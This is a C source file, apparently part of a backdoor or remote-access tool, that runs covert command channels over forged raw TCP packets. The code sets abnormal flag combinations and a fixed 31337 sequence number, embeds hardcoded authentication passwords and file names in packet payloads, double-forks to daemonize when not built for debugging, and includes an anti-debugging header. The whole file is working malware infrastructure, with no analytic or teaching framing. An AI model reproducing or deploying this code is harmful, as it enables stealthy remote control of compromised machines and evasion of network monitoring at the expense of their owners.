#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#include "../include/raw.h"
#include "../include/config.h"
#include "../include/common.h"
#include "../include/antidebug.h"

struct rawsock *find_rawsock_session(struct rawsock *r_v, unsigned long ip, short sport, short dport) {
    int i;
    debug("Looking for rawsocket local:%d => remote:%d ", sport, dport);
    for (i = 0; i < MAXRAWSESSIONS; i++) {
        if (r_v[i].sport == sport && r_v[i].dport == dport && r_v[i].host == ip) {
            if (kill(r_v[i].pid, 0)) {
                close(r_v[i].r[0]);
                close(r_v[i].r[1]);
                close(r_v[i].w[0]);
                close(r_v[i].w[1]);
                memset(&r_v[i], 0, sizeof(struct rawsock));
                continue;
            } else {
                debug("found!\n");
                return &r_v[i];
            }
        }
    }
    debug("NOT found!\n");
    return 0;

}

struct rawsock *create_rawsock_session(struct rawsock *r_v, unsigned long ip, int sport, int dport) {
    int i;
    struct rawsock *r = find_rawsock_session(r_v, ip, sport, dport);
    if (r) return r;

    for (i = 0; i < MAXRAWSESSIONS; i++) {
        if (r_v[i].pid == 0) {
            debug("Initializing rawsock[%d] local:%d => remote:%d\n", i, sport, dport);
            r_v[i].host = ip;
            r_v[i].sport = sport;
            r_v[i].dport = dport;
            pipe(r_v[i].r);
            pipe(r_v[i].w);
            // TODO: not use this variable, and use the id, also change id for port
            r_v[i].pid = start_rawsock_serverd(&r_v[i]);
            return &r_v[i];
        }
    }
    return 0;
}

void destroy_rawsock_session(struct rawsock *r) {
    if (!r) return;
    if (r->pid) {
        debug("Destroying rawsock with pid %d\n", r->pid);
        kill(r->pid, 9);
    }
    close(r->r[0]);
    close(r->r[1]);
    close(r->w[0]);
    close(r->w[1]);
    memset(r, 0, sizeof(struct rawsock));
}

void fill_rawsock_session(struct rawsock *r, unsigned char *data, int size) {
    if (!r) return;
    write(r->r[1], data, size);
}

void stop_rawsock_partner(struct rawsock *r, unsigned char * pass) {
    short pig_ack=0;
    char *datagram = malloc(sizeof(struct tcphdr) + 12 + sizeof(struct data));
    struct tcphdr *tcph = (struct tcphdr *) (datagram);
    struct sockaddr_in servaddr;
    memset(datagram, 0, sizeof(struct tcphdr) + 12 + sizeof(struct data)); /* zero out the buffer */
	struct data cmdpkt;
	// Generate packet
    memcpy(cmdpkt.pass, pass, 20);
    cmdpkt.port = r->sport;
    cmdpkt.action = STOPRAWSESSION;
    cmdpkt.size = 0;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = r->host;

    tcph->source = htons(r->sport); 
    tcph->dest = htons(r->dport); 
    tcph->seq = htonl(31337);
    tcph->ack_seq = htonl(pig_ack);/* in first SYN packet, ACK is not present */
    tcph->doff = 7+2+1 ;
    tcph->urg = 0;
    tcph->ack = 1;
    tcph->psh = 0;
    tcph->rst = 1;
    tcph->syn = 0;
    tcph->fin = 1;
    tcph->window = htons(57344); /* FreeBSD uses this value too */
    tcph->check = 0; /* we will compute it later */
    tcph->urg_ptr = 0;

    memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));
    if (sendto (s, datagram, sizeof(struct tcphdr) + 12 + sizeof(struct data) ,0, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) {
        //fprintf(stderr,"Error in sendto\n");
    }
    close(s);
    free(datagram);
}

void send_rawsock_action(struct rawsock *r, int action, char *file, unsigned char *clientauth) {
    short pig_ack=0;
    char *datagram = malloc(sizeof(struct tcphdr) + 12 + sizeof(struct data));
    struct tcphdr *tcph = (struct tcphdr *) (datagram);
    struct sockaddr_in servaddr;
    memset(datagram, 0, sizeof(struct tcphdr) + 12 + sizeof(struct data)); /* zero out the buffer */
    struct data cmdpkt;

    // Generate packet
    memcpy(cmdpkt.pass, clientauth, 20);
    cmdpkt.port = r->sport;
    cmdpkt.action = action;
    cmdpkt.size = 0;
    if (file) {
        memset(cmdpkt.bytes, 0, sizeof(cmdpkt.bytes));
        memcpy(cmdpkt.bytes, file, strlen(file));
    }

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = r->host;

    tcph->source = htons(r->sport); /* source port */
    tcph->dest = htons(r->dport); /* destination port */
    tcph->seq = htonl(31337);
    tcph->ack_seq = htonl(pig_ack);/* in first SYN packet, ACK is not present */
    tcph->doff = 7+2+1 ;
    tcph->urg = 0;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = 0;
    tcph->syn = 0;
    tcph->fin = 1;
    tcph->window = htons(57344); /* FreeBSD uses this value too */
    tcph->check = 0; /* we will compute it later */
    tcph->urg_ptr = 0;

    memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));
    if (sendto (s, datagram, sizeof(struct tcphdr) + 12 + sizeof(struct data) ,0, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) {
        //fprintf(stderr,"Error in sendto\n");
    }
    close(s);
    free(datagram);
}

// TODO: Implementar numeros de seqüencia i reenviament quan sigui necessari
int start_rawsock_serverd(struct rawsock *r) {
    if (!r->host) return 0;

    int size = sizeof(struct tcphdr) + 12 + sizeof(struct data);
    unsigned char datagram[size];
    struct tcphdr *tcph = (struct tcphdr *) (datagram);
    struct sockaddr_in servaddr;
    struct timeval tv;
	int nfd = 0;
    int pid;
    memset(datagram, 0, size); 

    // Timeout
    tv.tv_sec=TIMEOUT;
    tv.tv_usec=0;

    // To be a init child and have their pid
    pid = fork();
    if (pid) {
#if ! DEBUG
        int daemonPid = 0;
        waitpid(pid, &daemonPid, 0);
        return daemonPid;
#else
        return pid;
#endif        
    }
    else {
#if ! DEBUG
        pid = fork();
        if (pid) exit(pid);
#endif        
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = r->host;
        tcph->source = htons(r->sport);
        tcph->dest = htons(r->dport);
        tcph->seq = htonl(31337);
        tcph->ack_seq = htonl(0);
        tcph->doff = 7+2+1 ;
        tcph->urg = 0;
        tcph->ack = 0;
        tcph->psh = 0;
        tcph->rst = 1;
        tcph->syn = 0;
        tcph->fin = 0;
        tcph->window = htons(57344);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        struct data cmdpkt;
        cmdpkt.port = r->dport;
        cmdpkt.action = RAWSESSION;
        
        // Si envio el packet igual que el què espero, em salta raw_daemon
        memcpy(cmdpkt.pass, SERVERAUTH, 20);

        //debug("[%d] launching on port: %d => %d\n",getpid(), sport, dport);
        while (1) {
            fd_set fds;
            int count;
            unsigned char buf[BUFSIZE];
            // Timeout
            tv.tv_sec=TIMEOUT;
            tv.tv_usec=0;

            // put the fd to watch
            FD_ZERO(&fds);
            FD_SET(r->w[0], &fds);

            // there are data on pipe?
            nfd = select(r->w[0] + 1, &fds, NULL, NULL, &tv);
            if (nfd < 0 && (errno != EINTR)) break;
	        else if (nfd == 0) { break; }
 	        else {
                // if there ara data, send it throw raw packet
                if (FD_ISSET(r->w[0], &fds)) {
                    count = read(r->w[0], buf, BUFSIZE);
                    //debug("Enviant %d bytes al client\n", count);
                    cmdpkt.size = count;
                    memcpy(cmdpkt.bytes, buf, count);
                    memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));
                    sendto (s, datagram, size, 0, (struct sockaddr *) &servaddr, sizeof (servaddr));
                }
			}
        }
        close(s);
		debug("Closing swapd\n");
		exit(0);
    }
    return 0;
}

// TODO: Implementar numeros de seqüencia i reenviament quan sigui necessari
int start_rawsock_clientd(struct rawsock *r, unsigned char *clientauth, unsigned char *serverauth) {
    if (!r->host) return 0;

    int size = sizeof(struct tcphdr) + 12 + sizeof(struct data);
    unsigned char datagram[size];
    struct tcphdr *tcph = (struct tcphdr *) (datagram);
    struct sockaddr_in servaddr;
    memset(datagram, 0, size);
    struct sockaddr_in raw;
    unsigned int slen = sizeof(raw);
    struct packet p;
    struct timeval tv;
    int size2;
    int nfd = 0;

    // Timeout
    tv.tv_sec=TIMEOUT;
    tv.tv_usec=0;

    int pid = fork();
    if (!pid) {
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = r->host;
        tcph->source = htons(r->sport);
        tcph->dest = htons(r->dport);
        tcph->seq = htonl(31337);
        tcph->ack_seq = htonl(0);
        tcph->doff = 7+2+1 ;
        tcph->urg = 0;
        tcph->ack = 0;
        tcph->psh = 0;
        tcph->rst = 1;
        tcph->syn = 0;
        tcph->fin = 0;
        tcph->window = htons(57344);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        struct data cmdpkt;
        cmdpkt.port = r->sport;
        cmdpkt.action = RAWSESSION;
        
        // Si envio el packet igual que el què espero, em salta raw_daemon
        memcpy(cmdpkt.pass, clientauth, 20);

        //debug("[%d] launching on port: %d => %d\n",getpid(), sport, dport);
        while (1) {
            fd_set fds;
            int count;
            unsigned char buf[BUFSIZE];

            // Timeout
            tv.tv_sec=TIMEOUT;
            tv.tv_usec=0;

            // put the fd to watch
            FD_ZERO(&fds);
            FD_SET(r->w[0], &fds);
            FD_SET(s, &fds);

            // there are data in the pipe?
            nfd = select(max(r->w[0], s)  + 1, &fds, NULL, NULL, &tv);
            if (nfd < 0 && (errno != EINTR)) break;
	        else if (nfd == 0) { break; }
 	        else {
                // if there ara data, send it throw raw packet
                if (FD_ISSET(r->w[0], &fds)) {
                    count = read(r->w[0], buf, BUFSIZE);
                    //debug("Enviant %d bytes al client\n", count);
                    cmdpkt.size = count;
                    memcpy(cmdpkt.bytes, buf, count);
                    memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));
                    sendto (s, datagram, size, 0, (struct sockaddr *) &servaddr, sizeof (servaddr));
                }

                if (FD_ISSET(s, &fds)) {
                    size2 = recvfrom(s, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
                    // Si el tamany del paquet es el que toca
                    if (size2 == sizeof(struct packet)) {
                        // I el password és correcte
                        if (!memcmp(serverauth, p.action.pass, 20)) {
                            if (p.tcp.rst) {
                                if (p.action.port == r->sport) {
                                    fill_rawsock_session(r, p.action.bytes, p.action.size);
                                }
                            } 
                        }
                    }

                }
	    }
        }
        close(s);
		exit(0);
    } else {
        return pid;
    }
    return 0;
}
